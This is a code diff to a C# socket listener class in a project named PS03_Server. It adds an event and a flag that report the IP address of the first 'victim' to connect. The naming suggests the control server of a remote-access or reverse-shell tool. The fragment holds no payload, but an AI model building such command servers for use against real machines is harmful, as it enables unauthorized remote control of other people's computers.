@@ -12,10 +12,20 @@ namespace PS03_Server
     public class Listener
     {
         public delegate void OutputReadyHandler(string data);
+        public delegate void VictimConnectedHandler(string data);
         public event OutputReadyHandler OnOutputReady;
+
+        public event VictimConnectedHandler OnVictimConnected;
+        private bool VictimHooked = false;
+
         public void HandleOutputReady(string output)
         {
             OnOutputReady?.Invoke(output);
+        }
+
+        public void HandleVictimConnected(string victim)
+        {
+            OnVictimConnected?.Invoke(victim);
         }
 
         public void start()
@@ -25,6 +35,13 @@ namespace PS03_Server
             while (true)
             {
                 Socket client = listener.AcceptSocket();
+                if(!VictimHooked)
+                {
+                    IPEndPoint remoteIpEndPoint = client.RemoteEndPoint as IPEndPoint;
+                    HandleVictimConnected(remoteIpEndPoint.Address.ToString());
+                    VictimHooked = true;
+
+                }
 
                 var childSocketThread = new Thread(() =>
                 {
